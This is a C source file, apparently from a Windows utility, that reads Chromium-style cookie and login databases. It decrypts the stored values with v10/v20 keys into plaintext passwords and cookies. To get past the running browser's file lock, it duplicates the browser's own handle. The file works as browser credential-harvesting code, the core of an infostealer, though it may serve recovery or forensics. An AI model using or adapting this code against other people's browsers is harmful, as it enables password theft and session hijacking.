#include "AbeDecrypt.h"

#define SQLITE_API __declspec(dllimport)
#include <winsqlite/winsqlite3.h>
#pragma comment(lib, "winsqlite3.lib")

/* file name query buffer: FILE_NAME_INFORMATION plus a MAX_PATH name */
#define ABE_NAME_INFO_SIZE  ((ULONG)(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR)))

/*** SQLite database access ***/

/* opens the URI and validates it by preparing the SQL; on failure everything
   is closed again, the outputs are only written on success */
static int
AbeSqliteOpenPrepare(
    _In_z_ PCSTR Uri,
    _In_z_ PCSTR Sql,
    _Out_ sqlite3** Db,
    _Out_ sqlite3_stmt** St)
{
    sqlite3* Db_ = NULL;
    sqlite3_stmt* St_ = NULL;
    int ResultCode;

    ResultCode = sqlite3_open_v2(Uri, &Db_, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL);
    if (ResultCode == SQLITE_OK)
    {
        ResultCode = sqlite3_prepare_v2(Db_, Sql, -1, &St_, NULL);
    }
    if (ResultCode != SQLITE_OK)
    {
        if (St_ != NULL)
        {
            sqlite3_finalize(St_);
        }
        if (Db_ != NULL)
        {
            sqlite3_close(Db_);
        }
        return ResultCode;
    }
    *Db = Db_;
    *St = St_;
    return SQLITE_OK;
}

/* locked by the running browser: map its own handle into a private buffer */
static NTSTATUS
AbeReadLockedDatabase(
    _In_z_ PCWSTR DbPath,
    _Outptr_result_bytebuffer_(*RawSize) PBYTE* RawDb,
    _Out_ PULONG RawSize)
{
    FILE_PROCESS_IDS_USING_FILE_INFORMATION* Owners = NULL;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION Handles = NULL;
    FILE_NAME_INFORMATION* OwnName = NULL;
    IO_STATUS_BLOCK IoStatusBlock;
    HANDLE File = NULL, Process = NULL, Dup = NULL;
    ULONGLONG FileSize;
    IO_FILE_MAP Map;
    ULONG Length, Required, i, j;
    NTSTATUS Status;
    BOOL Found = FALSE;

    *RawDb = NULL;
    *RawSize = 0;

    /* an attributes-only open succeeds even while the browser holds the DB busy */
    Status = IO_OpenWin32File(&File,
                              DbPath,
                              NULL,
                              FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    /* our own volume-relative name, used to match the browser's handles */
    OwnName = Mem_Alloc(ABE_NAME_INFO_SIZE);
    if (OwnName == NULL)
    {
        Status = STATUS_NO_MEMORY;
        goto _Exit;
    }
    Status = NtQueryInformationFile(File,
                                    &IoStatusBlock,
                                    OwnName,
                                    ABE_NAME_INFO_SIZE,
                                    FileNameInformation);
    if (!NT_SUCCESS(Status))
    {
        goto _Exit;
    }

    /* who is holding this file? */
    Length = FIELD_OFFSET(FILE_PROCESS_IDS_USING_FILE_INFORMATION, ProcessIdList) +
             16 * sizeof(HANDLE);
    for (;;)
    {
        Owners = Mem_ReAlloc(Owners, Length);
        if (Owners == NULL)
        {
            Status = STATUS_NO_MEMORY;
            goto _Exit;
        }
        Status = NtQueryInformationFile(File,
                                        &IoStatusBlock,
                                        Owners,
                                        Length,
                                        FileProcessIdsUsingFileInformation);
        if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
            Status != STATUS_BUFFER_TOO_SMALL)
        {
            break;
        }
        Length *= 2;
        if (Length > 1 << 20)
        {
            Status = STATUS_BUFFER_TOO_SMALL;
            goto _Exit;
        }
    }
    if (!NT_SUCCESS(Status))
    {
        goto _Exit;
    }

    /* duplicate a matching handle from each owner (no system-wide enumeration) */
    for (i = 0; i < Owners->NumberOfProcessIdsInList && !Found; i++)
    {
        if (!NT_SUCCESS(PS_OpenProcess(&Process,
                                       PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                                       (ULONG)(ULONG_PTR)Owners->ProcessIdList[i])))
        {
            continue;
        }
        Length = 64 * 1024;
        Handles = NULL;
        for (;;)
        {
            Handles = Mem_ReAlloc(Handles, Length);
            if (Handles == NULL)
            {
                break;
            }
            Status = NtQueryInformationProcess(Process,
                                               ProcessHandleInformation,
                                               Handles,
                                               Length,
                                               &Required);
            if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
                Status != STATUS_BUFFER_TOO_SMALL)
            {
                break;
            }
            Length = max(Length * 2, Required + 4096);
            if (Length > 64 * 1024 * 1024)
            {
                break;
            }
        }
        if (Handles == NULL || !NT_SUCCESS(Status))
        {
            goto _NextOwner;
        }

        for (j = 0; j < Handles->NumberOfHandles && !Found; j++)
        {
            FILE_NAME_INFORMATION* Name;
            UNICODE_STRING A, B;

            if (!NT_SUCCESS(NtDuplicateObject(Process,
                                              Handles->Handles[j].HandleValue,
                                              NtCurrentProcess(),
                                              &Dup,
                                              0,
                                              0,
                                              DUPLICATE_SAME_ACCESS)))
            {
                continue;
            }
            /* non-file handles fail this query instantly (no hang) */
            Name = Mem_Alloc(ABE_NAME_INFO_SIZE);
            if (Name != NULL &&
                NT_SUCCESS(NtQueryInformationFile(Dup,
                                                  &IoStatusBlock,
                                                  Name,
                                                  ABE_NAME_INFO_SIZE,
                                                  FileNameInformation)) &&
                Name->FileNameLength == OwnName->FileNameLength)
            {
                A.Length = A.MaximumLength = (USHORT)OwnName->FileNameLength;
                A.Buffer = OwnName->FileName;
                B.Length = B.MaximumLength = (USHORT)Name->FileNameLength;
                B.Buffer = Name->FileName;
                if (RtlEqualUnicodeString(&A, &B, TRUE) &&
                    NT_SUCCESS(IO_GetFileSize(Dup, &FileSize)) &&
                    FileSize > 0 && FileSize < 64 * 1024 * 1024 &&
                    NT_SUCCESS(IO_MapReadOnlyFile(Dup, &Map)))
                {
                    *RawDb = Mem_Alloc((SIZE_T)FileSize);
                    if (*RawDb != NULL)
                    {
                        RtlCopyMemory(*RawDb, Map.BaseAddress, (SIZE_T)FileSize);
                        *RawSize = (ULONG)FileSize;
                        Found = TRUE;
                    }
                    IO_UnmapFile(&Map);
                }
            }
            Mem_Free(Name);
            NtClose(Dup);
            Dup = NULL;
        }

_NextOwner:
        Mem_Free(Handles);
        Handles = NULL;
        NtClose(Process);
        Process = NULL;
    }
    Status = Found ? STATUS_SUCCESS : STATUS_NOT_FOUND;

_Exit:
    if (Dup != NULL)
    {
        NtClose(Dup);
    }
    if (Process != NULL)
    {
        NtClose(Process);
    }
    Mem_Free(Handles);
    Mem_Free(Owners);
    Mem_Free(OwnName);
    NtClose(File);
    return Status;
}

/*** record collection ***/

/* appends a zeroed record and returns it, or NULL when out of memory */
static PABE_RECORD
AbeAppendRecord(
    _Inout_ PABE_RECORD* Array,
    _Inout_ PULONG Count,
    _Inout_ PULONG Capacity)
{
    if (*Count == *Capacity)
    {
        PABE_RECORD NewArray;

        *Capacity = *Capacity != 0 ? *Capacity * 2 : 64;
        NewArray = Mem_ReAlloc(*Array, *Capacity * sizeof(**Array));
        if (NewArray == NULL)
        {
            return NULL;
        }
        *Array = NewArray;
    }
    RtlZeroMemory(&(*Array)[*Count], sizeof(**Array));
    (*Count)++;
    return &(*Array)[*Count - 1];
}

/* TRUE when an identical record was already collected from another database */
static BOOL
AbeIsDuplicateRecord(
    _In_reads_(Count) const ABE_RECORD* Records,
    _In_ ULONG Count,
    _In_ const ABE_RECORD* Record)
{
    ULONG i;

    for (i = 0; i < Count; i++)
    {
        if (Str_EqualW(Records[i].Version, Record->Version) &&
            Str_EqualW(Records[i].Site, Record->Site) &&
            Str_EqualW(Records[i].Name, Record->Name) &&
            Str_EqualW(Records[i].Value, Record->Value))
        {
            return TRUE;
        }
    }
    return FALSE;
}

VOID
AbeCollectRecords(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_z_ PCWSTR Profile,
    _In_z_ PCSTR DbFile,
    _In_ LOGICAL IsCookie,
    _In_opt_ const BYTE* V10Key,
    _In_opt_ const BYTE* V20Key,
    _In_ ULONG V20EnvelopeVersion,
    _In_ LOGICAL Dedupe,
    _Inout_ PABE_RESULT Result)
{
    static const CHAR CookieSql[] =
        "SELECT host_key,name,encrypted_value FROM cookies";
    static const CHAR PasswordSql[] =
        "SELECT origin_url,username_value,password_value FROM logins";
    PABE_RECORD* Records = IsCookie ? &Result->Cookies : &Result->Passwords;
    PULONG RecordCount = IsCookie ? &Result->CookieCount : &Result->PasswordCount;
    PULONG Capacity = IsCookie ? &Result->CookieCapacity : &Result->PasswordCapacity;
    WCHAR DbPath[MAX_PATH];
    sqlite3* Db = NULL;
    sqlite3_stmt* St = NULL;
    PBYTE RawDb = NULL;
    ULONG RawSize = 0;
    static BYTE Plain[4096];
    const BYTE* Blob;
    const char *Site, *Name;
    DWORD Length, Skip, PlainLength;
    ULONG Translated;
    NTSTATUS Status;
    int ResultCode;

    Str_PrintfExW(DbPath,
                  MAX_PATH,
                  L"%ls\\%ls\\%hs",
                  Browser->UserDataDir,
                  Profile,
                  DbFile);
    /* skip when the database file does not exist at all */
    {
        FILE_NETWORK_OPEN_INFORMATION Attributes;

        if (!NT_SUCCESS(IO_GetWin32FileAttributes(DbPath, NULL, &Attributes)) ||
            BooleanFlagOn(Attributes.FileAttributes, FILE_ATTRIBUTE_DIRECTORY))
        {
            return;
        }
    }

    /* try: mode=ro&nolock=1 → immutable → duplicate the owner's handle + deserialize.
       SQLite opens lazily: lock conflicts surface at prepare time, so each
       tier must be validated by prepare, not just the open call */
    {
        static CHAR Uri[MAX_PATH * 3];
        CHAR Utf8[MAX_PATH * 3];
        PCSTR Sql = IsCookie ? CookieSql : PasswordSql;
        PSTR Query;
        ULONG i;

        if (Str_W2U(Utf8, DbPath) == 0)
        {
            AbeLog(L"%hs: database unavailable (path)\r\n", DbFile);
            return;
        }
        Str_PrintfExA(Uri, ARRAYSIZE(Uri), "file:");
        Query = Uri + strlen(Uri);
        for (i = 0; i < (ULONG)(Str_SizeA(Utf8) / sizeof(CHAR)); i++)
        {
            *Query++ = Utf8[i] == '\\' ? '/' : Utf8[i];
        }
        *Query = 0;

        Str_PrintfExA(Query, ARRAYSIZE(Uri) - (ULONG)(Query - Uri), "?mode=ro&nolock=1");
        ResultCode = AbeSqliteOpenPrepare(Uri, Sql, &Db, &St);
        if (ResultCode != SQLITE_OK)
        {
            Str_PrintfExA(Query, ARRAYSIZE(Uri) - (ULONG)(Query - Uri), "?immutable=1");
            ResultCode = AbeSqliteOpenPrepare(Uri, Sql, &Db, &St);
        }
        if (ResultCode != SQLITE_OK && NT_SUCCESS(AbeReadLockedDatabase(DbPath, &RawDb, &RawSize)))
        {
            ResultCode = sqlite3_open_v2(":memory:", &Db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, NULL);
            if (ResultCode == SQLITE_OK)
            {
                ResultCode = sqlite3_deserialize(Db,
                                                 "main",
                                                 RawDb,
                                                 (sqlite3_int64)RawSize,
                                                 (sqlite3_int64)RawSize,
                                                 SQLITE_DESERIALIZE_READONLY);
                if (ResultCode == SQLITE_OK)
                {
                    ResultCode = sqlite3_prepare_v2(Db, Sql, -1, &St, NULL);
                }
            }
            if (ResultCode != SQLITE_OK)
            {
                if (St != NULL)
                {
                    sqlite3_finalize(St);
                }
                sqlite3_close(Db);
                Db = NULL;
                Mem_Free(RawDb);
                RawDb = NULL;
            }
        }
    }
    if (ResultCode != SQLITE_OK || St == NULL)
    {
        AbeLog(L"%hs: database unavailable (%d)\r\n", DbFile, ResultCode);
        return;
    }

    while (sqlite3_step(St) == SQLITE_ROW)
    {
        PABE_RECORD Record;
        const BYTE* Key = NULL;
        PCSTR Ver = NULL;
        CHAR Version[16];

        Site = (const char*)sqlite3_column_text(St, 0);
        Name = (const char*)sqlite3_column_text(St, 1);
        Blob = (const BYTE*)sqlite3_column_blob(St, 2);
        Length = (DWORD)sqlite3_column_bytes(St, 2);

        /* determine version prefix and pick the key */
        if (Blob != NULL && Length >= 3)
        {
            if (memcmp(Blob, "v20", 3) == 0)
            {
                Ver = "v20";
                Key = V20Key;
            } else if (memcmp(Blob, "v10", 3) == 0 || memcmp(Blob, "v11", 3) == 0)
            {
                Ver = memcmp(Blob, "v10", 3) == 0 ? "v10" : "v11";
                Key = V10Key;
            }
        }

        /* append the record even on failure: the entry itself stays visible */
        Record = AbeAppendRecord(Records, RecordCount, Capacity);
        if (Record == NULL)
        {
            break;
        }
        if (Ver == NULL)
        {
            Ver = "v????";
        }
        if (Str_EqualA(Ver, "v20") && V20EnvelopeVersion != 0)
        {
            Str_PrintfA(Version, "v20-v%lu", V20EnvelopeVersion);
            Ver = Version;
        }
        Str_A2W(Record->Version, Ver);
        Str_U2W(Record->Site, Site != NULL ? Site : "");
        Str_U2W(Record->Name, Name != NULL ? Name : "");

        if (Blob == NULL || Length <= 3 + 12 + 16 || Length > sizeof(Plain) + 3 + 12 + 16)
        {
            Str_PrintfW(Record->Value, L"Decrypt failed: bad data length (%lu bytes)", Length);
            continue;
        }
        if (Key == NULL)
        {
            Str_PrintfW(Record->Value, L"Decrypt failed: %hs key missing", Ver);
            continue;
        }
        Status = AbeGcmDecrypt(Key, Blob, Length, Plain);
        if (!NT_SUCCESS(Status))
        {
            Str_PrintfW(Record->Value, L"Decrypt failed: 0x%08lX", Status);
            continue;
        }

        /* cookie values since schema 24 carry SHA256(host_key) in front */
        Skip = IsCookie && Length > 3 + 12 + 16 + 32 ? 32 : 0;
        PlainLength = Length - 3 - 12 - 16 - Skip;
        Status = RtlUTF8ToUnicodeN(Record->Value,
                                   sizeof(Record->Value) - sizeof(UNICODE_NULL),
                                   &Translated,
                                   (PCCH)Plain + Skip,
                                   PlainLength);
        if (!NT_SUCCESS(Status) && Status != STATUS_BUFFER_OVERFLOW)
        {
            Str_PrintfW(Record->Value, L"Decrypt failed: 0x%08lX", Status);
            continue;
        }
        if (Translated > sizeof(Record->Value) - sizeof(UNICODE_NULL))
        {
            Translated = sizeof(Record->Value) - sizeof(UNICODE_NULL);
        }
        Record->Value[Translated / sizeof(WCHAR)] = UNICODE_NULL;

        if (Dedupe && AbeIsDuplicateRecord(*Records, *RecordCount - 1, Record))
        {
            (*RecordCount)--;   /* already known from the main store */
        }
    }
    sqlite3_finalize(St);
    sqlite3_close(Db);
    Mem_Free(RawDb);
}
